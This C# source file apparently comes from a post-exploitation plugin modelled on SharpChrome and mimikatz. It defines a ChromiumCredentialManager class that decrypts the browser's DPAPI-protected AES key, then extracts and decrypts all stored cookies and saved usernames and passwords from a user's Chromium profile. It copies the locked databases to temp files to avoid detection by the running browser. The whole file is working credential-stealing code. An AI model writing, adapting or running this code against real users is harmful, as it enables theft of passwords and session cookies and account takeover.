using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using CS_SQLite3;
using Utils;

namespace Plugin
{
    internal class ChromiumCredentialManager
    {
        internal const int AES_BLOCK_SIZE = 16;

        internal static byte[] DPAPI_HEADER = Encoding.UTF8.GetBytes("DPAPI");
        internal static byte[] DPAPI_CHROME_UNKV10 = Encoding.UTF8.GetBytes("v10");
        internal byte[] aesKey;
        internal string chromiumBasePath;

        internal string[] filterDomains;
        internal BCrypt.SafeAlgorithmHandle hAlg;
        internal BCrypt.SafeKeyHandle hKey;
        internal string userChromiumBookmarksPath;
        internal string userChromiumCookiesPath;
        internal string userChromiumHistoryPath;
        internal string userChromiumLoginDataPath;
        internal string userDataPath;
        internal string userLocalStatePath;
        internal bool useTmpFile;

        public ChromiumCredentialManager(string basePath, string[] domains = null)
        {
            if (Environment.GetEnvironmentVariable("USERNAME").Contains("SYSTEM"))
                throw new Exception("Cannot decrypt Chromium credentials from a SYSTEM level context.");
            if (domains != null && domains.Length > 0)
                filterDomains = domains;
            var localAppData = Environment.GetEnvironmentVariable("LOCALAPPDATA");
            hKey = null;
            hAlg = null;
            chromiumBasePath = basePath;
            userChromiumHistoryPath = chromiumBasePath + "\\Default\\History";
            userChromiumBookmarksPath = chromiumBasePath + "\\Default\\Bookmarks";
            userChromiumCookiesPath = chromiumBasePath + "\\Default\\Cookies";
            userChromiumLoginDataPath = chromiumBasePath + "\\Default\\Login Data";
            userLocalStatePath = chromiumBasePath + "Local State";
            if (!Chromium())
                throw new Exception("User chromium data files not present.");
            useTmpFile = true;
            //Process[] chromeProcesses = Process.GetProcessesByName("chrome");
            //if (chromeProcesses.Length > 0)
            //{
            //    useTmpFile = true;
            //}
            var key = GetBase64EncryptedKey();
            if (key != "")
            {
                //Console.WriteLine("Normal DPAPI Decryption");
                aesKey = DecryptBase64StateKey(key);
                if (aesKey == null)
                    throw new Exception("Failed to decrypt AES Key.");
                DPAPIChromiumAlgFromKeyRaw(aesKey, out hAlg, out hKey);
                if (hAlg == null || hKey == null)
                    throw new Exception("Failed to create BCrypt Symmetric Key.");
            }
        }

        private HostCookies[] ExtractCookiesFromSQLQuery(DataTable query)
        {
            var cookies = new List<Cookie>();
            var hostCookies = new List<HostCookies>();
            HostCookies hostInstance = null;
            var lastHostKey = "";
            foreach (DataRow row in query.Rows)
                try
                {
                    if (row == null)
                        continue;
                    if (row["host_key"].GetType() != typeof(DBNull) && lastHostKey != (string)row["host_key"])
                    {
                        lastHostKey = (string)row["host_key"];
                        if (hostInstance != null)
                        {
                            hostInstance.Cookies = cookies.ToArray();
                            hostCookies.Add(hostInstance);
                        }

                        hostInstance = new HostCookies();
                        hostInstance.HostName = lastHostKey;
                        cookies = new List<Cookie>();
                    }

                    var cookie = new Cookie();
                    cookie.Domain = row["host_key"].ToString();
                    long expDate;
                    long.TryParse(row["expires_utc"].ToString(), out expDate);
                    // https://github.com/djhohnstein/SharpChrome/issues/1
                    if (expDate / 1000000.000000000000 - 11644473600 > 0)
                        cookie.ExpirationDate = expDate / 1000000.000000000000000 - 11644473600;
                    cookie.HostOnly =
                        cookie.Domain[0] == '.'
                            ? false
                            : true; // I'm not sure this is stored in the cookie store and seems to be always false
                    if (row["is_httponly"].ToString() == "1")
                        cookie.HttpOnly = true;
                    else
                        cookie.HttpOnly = false;
                    cookie.Name = row["name"].ToString();
                    cookie.Path = row["path"].ToString();
                    // cookie.SameSite = "no_restriction"; // Not sure if this is the same as firstpartyonly
                    if (row["is_secure"].ToString() == "1")
                        cookie.Secure = true;
                    else
                        cookie.Secure = false;
                    cookie.Session =
                        row["is_persistent"].ToString() == "0" ? true : false; // Unsure, this seems to be false always
                    //cookie.StoreId = "0"; // Static
                    cookie.StoreId = null;
                    cookie.SetSameSiteCookie(row["sameSite"].ToString());
                    var cookieValue = Convert.FromBase64String(row["encrypted_value"].ToString());
                    cookieValue = DecryptBlob(cookieValue);
                    if (cookieValue != null)
                        cookie.Value = Encoding.UTF8.GetString(cookieValue);
                    else
                        cookie.Value = "";
                    if (cookie != null)
                        cookies.Add(cookie);
                }
                catch
                {
                }

            return hostCookies.ToArray();
        }

        private byte[] DecryptBlob(byte[] dwData)
        {
            if (hKey == null && hAlg == null)
                return ProtectedData.Unprotect(dwData, null, DataProtectionScope.CurrentUser);
            byte[] dwDataOut = null;
            // magic decryption happens here
            BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
            int dwDataOutLen;
            //IntPtr pDataOut = IntPtr.Zero;
            var pData = IntPtr.Zero;
            uint ntStatus;
            byte[] subArrayNoV10;
            var pcbResult = 0;
            unsafe
            {
                if (ByteArrayEquals(dwData, 0, DPAPI_CHROME_UNKV10, 0, 3))
                {
                    subArrayNoV10 = new byte[dwData.Length - DPAPI_CHROME_UNKV10.Length];
                    Array.Copy(dwData, 3, subArrayNoV10, 0, dwData.Length - DPAPI_CHROME_UNKV10.Length);
                    pData = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(byte)) * dwData.Length);
                    //byte[] shiftedEncVal = new byte[dwData.Length - 3];
                    //Array.Copy(dwData, 3, shiftedEncVal, 0, dwData.Length - 3);
                    //IntPtr shiftedEncValPtr = IntPtr.Zero;
                    try
                    {
                        //shiftedEncValPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(byte)) * shiftedEncVal.Length);
                        Marshal.Copy(dwData, 0, pData, dwData.Length);
                        MiscUtils.BCRYPT_INIT_AUTH_MODE_INFO(out info);
                        info.pbNonce = (byte*)(pData + DPAPI_CHROME_UNKV10.Length);
                        info.cbNonce = 12;
                        info.pbTag = info.pbNonce + dwData.Length -
                                     (DPAPI_CHROME_UNKV10.Length + AES_BLOCK_SIZE); // AES_BLOCK_SIZE = 16
                        info.cbTag = AES_BLOCK_SIZE; // AES_BLOCK_SIZE = 16
                        dwDataOutLen = dwData.Length - DPAPI_CHROME_UNKV10.Length - info.cbNonce - info.cbTag;
                        dwDataOut = new byte[dwDataOutLen];

                        fixed (byte* pDataOut = dwDataOut)
                        {
                            ntStatus = BCrypt.BCryptDecrypt(hKey, info.pbNonce + info.cbNonce, dwDataOutLen, &info,
                                null, 0, pDataOut, dwDataOutLen, out pcbResult, 0);
                        }

                        if (NT_SUCCESS(ntStatus))
                        {
                            //Console.WriteLine("{0} : {1}", dwDataOutLen, pDataOut);
                        }
                    }
                    catch (Exception ex)
                    {
                    }
                    finally
                    {
                        if (pData != null && pData != IntPtr.Zero)
                            Marshal.FreeHGlobal(pData);
                        //if (pDataOut != null && pDataOut != IntPtr.Zero)
                        //    Marshal.FreeHGlobal(pDataOut);
                        //if (pInfo != null && pInfo != IntPtr.Zero)
                        //    Marshal.FreeHGlobal(pDataOut);
                    }
                }
            }

            return dwDataOut;
        }

        // You want cookies? Get them here.
        public HostCookies[] GetCookies()
        {
            var cookiePath = userChromiumCookiesPath;
            if (useTmpFile)
                cookiePath = FileUtils.CreateTempDuplicateFile(userChromiumCookiesPath);
            var database = new SQLiteDatabase(cookiePath);
            var query = "SELECT * FROM cookies ORDER BY host_key";
            var resultantQuery = database.ExecuteQuery(query);
            database.CloseDatabase();
            var rawCookies = ExtractCookiesFromSQLQuery(resultantQuery);
            if (useTmpFile)
                try
                {
                    File.Delete(cookiePath);
                }
                catch
                {
                    Console.WriteLine("[X] Failed to delete temp cookie path at {0}", cookiePath);
                }

            return rawCookies;
        }


        public SavedLogin[] GetSavedLogins()
        {
            var loginData = userChromiumLoginDataPath;
            if (useTmpFile)
                loginData = FileUtils.CreateTempDuplicateFile(loginData);
            var database = new SQLiteDatabase(loginData);
            var query = "SELECT action_url, username_value, password_value FROM logins";
            var resultantQuery = database.ExecuteQuery(query);
            var logins = new List<SavedLogin>();
            foreach (DataRow row in resultantQuery.Rows)
            {
                var password = string.Empty;
                var passwordBytes = Convert.FromBase64String((string)row["password_value"]);
                var decBytes = DecryptBlob(passwordBytes);
                if (decBytes != null)
                    // https://github.com/djhohnstein/SharpChrome/issues/6
                    password = Encoding.UTF8.GetString(decBytes);
                if (password != string.Empty)
                    logins.Add(new SavedLogin(row["action_url"].ToString(), row["username_value"].ToString(),
                        password));
            }

            database.CloseDatabase();
            return logins.ToArray();
        }


        private bool Chromium()
        {
            string[] paths =
            {
                userChromiumHistoryPath,
                userChromiumCookiesPath,
                userChromiumBookmarksPath,
                userChromiumLoginDataPath,
                userLocalStatePath
            };
            foreach (var path in paths)
                if (File.Exists(path))
                    return true;
            return false;
        }

        public static byte[] DecryptBase64StateKey(string base64Key)
        {
            var encryptedKeyBytes = Convert.FromBase64String(base64Key);
            if (ByteArrayEquals(DPAPI_HEADER, 0, encryptedKeyBytes, 0, 5))
            {
                //Console.WriteLine("> Key appears to be encrypted using DPAPI");
                var encryptedKey = new byte[encryptedKeyBytes.Length - 5];
                Array.Copy(encryptedKeyBytes, 5, encryptedKey, 0, encryptedKeyBytes.Length - 5);
                var decryptedKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
                return decryptedKey;
            }

            Console.WriteLine("Unknown encoding.");
            return null;
        }

        private static bool ByteArrayEquals(byte[] sourceArray, int sourceIndex, byte[] destArray, int destIndex,
            int len)
        {
            var j = destIndex;
            for (var i = sourceIndex; i < sourceIndex + len; i++)
            {
                if (sourceArray[i] != destArray[j])
                    return false;
                j++;
            }

            return true;
        }

        public string GetBase64EncryptedKey()
        {
            if (!File.Exists(userLocalStatePath))
                return "";
            var localStateData = File.ReadAllText(userLocalStatePath);
            var searchTerm = "encrypted_key";
            var startIndex = localStateData.IndexOf(searchTerm);
            if (startIndex < 0)
                return "";
            // encrypted_key":"BASE64"
            var keyIndex = startIndex + searchTerm.Length + 3;
            var tempVals = localStateData.Substring(keyIndex);
            var stopIndex = tempVals.IndexOf('"');
            if (stopIndex < 0)
                return "";
            var base64Key = tempVals.Substring(0, stopIndex);
            return base64Key;
        }

        private static bool NT_SUCCESS(uint status)
        {
            return 0 == status;
        }

        //kuhl_m_dpapi_chrome_alg_key_from_raw
        public static bool DPAPIChromiumAlgFromKeyRaw(byte[] key, out BCrypt.SafeAlgorithmHandle hAlg,
            out BCrypt.SafeKeyHandle hKey)
        {
            var bRet = false;
            hAlg = null;
            hKey = null;
            uint ntStatus;
            ntStatus = BCrypt.BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0);
            if (NT_SUCCESS(ntStatus))
            {
                ntStatus = BCrypt.BCryptSetProperty(hAlg, "ChainingMode", "ChainingModeGCM", 0);
                if (NT_SUCCESS(ntStatus))
                {
                    ntStatus = BCrypt.BCryptGenerateSymmetricKey(hAlg, out hKey, null, 0, key, key.Length);
                    if (NT_SUCCESS(ntStatus))
                        bRet = true;
                }
            }

            return bRet;
        }
    }
}